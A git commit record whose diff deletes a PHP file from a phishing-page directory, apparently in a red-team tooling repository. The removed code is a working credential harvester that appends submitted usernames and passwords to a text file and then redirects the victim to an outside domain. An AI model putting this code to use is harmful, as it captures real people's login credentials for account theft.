72353faa769e977408e43983a257f7ceecbf8f3a
Steve Borosh <rvrsh3ll@users.noreply.github.com>
2022-06-06 09:26:07 -0400

    Delete HTML-Phishing-Page/gitsite directory

--- HTML-Phishing-Page/gitsite/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['loginfmt'] . " Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://remote.warbrugpincus.tom');
-exit();
-?>
